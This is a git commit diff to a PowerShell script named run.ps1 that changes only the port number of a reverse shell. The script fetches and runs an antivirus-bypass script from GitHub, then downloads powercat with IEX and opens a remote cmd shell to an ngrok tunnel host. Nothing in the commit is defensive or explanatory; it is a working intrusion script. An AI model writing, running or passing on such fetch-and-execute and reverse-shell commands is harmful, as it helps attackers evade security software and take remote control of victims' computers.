e606bca1e92e96293ebf103a9c81a59f1e45eb83
Osman Kandemir <juanter53@hotmail.com>
2022-09-30 00:20:46 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -3,4 +3,4 @@ $wshell = New-Object -ComObject wscript.shell;
 $wshell.AppActivate('Google - Microsoft Edge')
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
 Invoke-AlokS-AvBypass;
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 15280 -e cmd
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 19875 -e cmd
